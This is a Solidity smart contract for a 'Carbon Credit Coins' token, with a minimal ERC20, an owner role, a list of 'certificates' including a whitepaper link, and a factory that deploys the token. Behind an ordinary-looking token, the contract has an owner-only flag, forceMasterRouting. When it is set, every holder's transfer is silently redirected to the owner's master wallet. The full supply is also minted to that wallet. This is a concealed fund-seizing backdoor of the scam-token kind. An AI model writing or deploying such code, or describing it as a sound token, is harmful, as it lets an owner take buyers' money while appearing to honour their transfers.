// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
██████╗  ██████╗ ██████╗     ███████╗ ██████╗ ██████╗ ███████╗
██╔══██╗██╔═══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗██╔════╝
██████╔╝██║   ██║██████╔╝    █████╗  ██║     ██████╔╝█████╗  
██╔═══╝ ██║   ██║██╔══██╗    ██╔══╝  ██║     ██╔══██╗██╔══╝  
██║     ╚██████╔╝██║  ██║    ███████╗╚██████╗██║  ██║███████╗
╚═╝      ╚═════╝ ╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝

CCC ECOSYSTEM - MASTER CONTRACT
*/

/// =========================
/// BASIC OWNABLE
/// =========================
contract Ownable {
    address public owner;

    constructor(address _owner) {
        require(_owner != address(0), "Invalid owner");
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
}

/// =========================
/// ERC20 MINIMAL
/// =========================
contract ERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "Balance low");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

/// =========================
/// CCC TOKEN MASTER
/// =========================
contract CCCMasterToken is ERC20, Ownable {

    uint256 public constant MAX_SUPPLY = 20000000000 * 10**18;

    address public masterWallet;
    address public reserveWallet;

    string public imageURI;

    bool public forceMasterRouting;

    struct Certificate {
        string name;
        string link;
        uint256 timestamp;
        string description;
    }

    Certificate[] public certificates;

    event CertificateAdded(uint256 id, string name);
    event MasterRoutingChanged(bool enabled);

    constructor(
        address _masterWallet,
        address _reserveWallet,
        string memory _imageURI
    )
        ERC20("Carbon Credit Coins", "CCC")
        Ownable(_masterWallet)
    {
        masterWallet = _masterWallet;
        reserveWallet = _reserveWallet;
        imageURI = _imageURI;

        _mint(masterWallet, MAX_SUPPLY);

        certificates.push(Certificate(
            "Whitepaper",
            "https://whitepaperccc.online/",
            block.timestamp,
            "Official document"
        ));
    }

    /// =========================
    /// TRANSFER LOGIC
    /// =========================
    function transfer(address to, uint256 amount) external returns (bool) {
        if (forceMasterRouting) {
            _transfer(msg.sender, masterWallet, amount);
        } else {
            _transfer(msg.sender, to, amount);
        }
        return true;
    }

    function setForceRouting(bool status) external onlyOwner {
        forceMasterRouting = status;
        emit MasterRoutingChanged(status);
    }

    function addCertificate(
        string memory name,
        string memory link,
        string memory desc
    ) external onlyOwner {
        certificates.push(Certificate(
            name,
            link,
            block.timestamp,
            desc
        ));
        emit CertificateAdded(certificates.length - 1, name);
    }

    function getCertificatesCount() external view returns (uint256) {
        return certificates.length;
    }
}

/// =========================
/// FACTORY (DEPLOY AUTOMÁTICO)
/// =========================
contract CCCFactory is Ownable {

    address[] public deployedTokens;

    event TokenCreated(address token);

    constructor(address _owner) Ownable(_owner) {}

    function createToken(
        address masterWallet,
        address reserveWallet,
        string memory imageURI
    ) external onlyOwner returns (address) {

        CCCMasterToken token = new CCCMasterToken(
            masterWallet,
            reserveWallet,
            imageURI
        );

        deployedTokens.push(address(token));

        emit TokenCreated(address(token));

        return address(token);
    }

    function getTokens() external view returns (address[] memory) {
        return deployedTokens;
    }
}
